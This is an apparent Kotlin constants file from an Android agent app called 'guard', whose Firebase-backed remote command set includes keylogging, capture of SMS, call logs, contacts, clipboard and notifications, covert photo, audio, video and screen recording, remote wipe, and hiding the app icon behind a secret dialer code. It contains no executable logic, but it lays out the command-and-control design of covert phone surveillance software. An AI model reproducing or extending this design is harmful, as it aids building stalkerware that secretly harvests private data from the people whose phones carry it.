package com.guard.agent.core

object Constants {

    // SharedPreferences
    const val PREFS_NAME = "guard_prefs"
    const val KEY_DEVICE_KEY = "device_key"
    const val KEY_SETUP_DONE = "setup_done"
    const val KEY_ICON_HIDDEN = "icon_hidden"
    const val KEY_LAST_SEEN = "last_seen"
    const val KEY_OLD_SIM = "old_sim_serial"

    // Notification
    const val CHANNEL_ID = "guard_channel"
    const val NOTIF_ID = 1001
    const val SCREEN_CAPTURE_NOTIF_ID = 1002

    // Firebase paths
    const val PATH_DEVICES = "devices"
    const val PATH_COMMANDS = "commands"
    const val PATH_COMMAND_HISTORY = "commandHistory"
    const val PATH_GEOFENCES = "geofences"
    const val PATH_OFFLINE_QUEUE = "offlineQueue"
    const val PATH_UPDATES = "updates"

    // Firebase sub-paths
    const val SUB_INFO = "info"
    const val SUB_LOCATION = "location"
    const val SUB_LOCATION_HISTORY = "locationHistory"
    const val SUB_BATTERY = "battery"
    const val SUB_NETWORK = "network"
    const val SUB_SIM = "sim"
    const val SUB_PHOTOS = "photos"
    const val SUB_AUDIOS = "audios"
    const val SUB_SCREENSHOTS = "screenshots"
    const val SUB_SCREEN_RECORDS = "screenRecords"
    const val SUB_GALLERY = "gallery"
    const val SUB_CONTACTS = "contacts"
    const val SUB_CALL_LOGS = "callLogs"
    const val SUB_SMS = "sms"
    const val SUB_APPS = "apps"
    const val SUB_FILES = "files"
    const val SUB_KEYLOGS = "keylogs"
    const val SUB_NOTIFICATIONS = "notifications"
    const val SUB_CLIPBOARD = "clipboard"
    const val SUB_LAST_SEEN = "lastSeen"
    const val SUB_FCM_TOKEN = "fcmToken"
    const val SUB_ADMIN_ENABLED = "adminEnabled"
    const val SUB_STATUS = "status"
    const val SUB_VERSION = "version"

    // Command names
    const val CMD_LOCATION = "LOCATION"
    const val CMD_SNAP = "SNAP"
    const val CMD_REC = "REC"
    const val CMD_VIDEO = "VIDEO"
    const val CMD_SCREENREC = "SCREENREC"
    const val CMD_SCREENSHOT = "SCREENSHOT"
    const val CMD_LOCK = "LOCK"
    const val CMD_ALARM = "ALARM"
    const val CMD_STOP_ALARM = "STOP_ALARM"
    const val CMD_WIPE = "WIPE"
    const val CMD_PING = "PING"
    const val CMD_BATTERY = "BATTERY"
    const val CMD_NETWORK = "NETWORK"
    const val CMD_CONTACTS = "CONTACTS"
    const val CMD_CALLLOGS = "CALLLOGS"
    const val CMD_SMS = "SMS"
    const val CMD_APPS = "APPS"
    const val CMD_GALLERY = "GALLERY"
    const val CMD_FILES = "FILES"
    const val CMD_CLIPBOARD = "CLIPBOARD"
    const val CMD_NOTIFS = "NOTIFS"
    const val CMD_KEYLOGS = "KEYLOGS"
    const val CMD_GEOFENCE_ADD = "GEOFENCE_ADD"
    const val CMD_GEOFENCE_DEL = "GEOFENCE_DEL"
    const val CMD_UPDATE = "UPDATE"
    const val CMD_HIDE = "HIDE"
    const val CMD_SHOW = "SHOW"

    // Command status
    const val STATUS_PENDING = "pending"
    const val STATUS_DONE = "done"
    const val STATUS_FAILED = "failed"

    // Location
    const val LOCATION_INTERVAL_MS = 15 * 60 * 1000L
    const val LOCATION_MIN_INTERVAL_MS = 5 * 60 * 1000L
    const val LOCATION_MIN_DISTANCE_M = 50f

    // Heartbeat
    const val HEARTBEAT_INTERVAL_MIN = 15L

    // Recording
    const val DEFAULT_AUDIO_SECONDS = 60
    const val DEFAULT_SCREEN_SECONDS = 30
    const val DEFAULT_VIDEO_SECONDS = 30

    // Dialer secret code
    const val SECRET_DIAL_CODE = "*#*#6969#*#*"
}
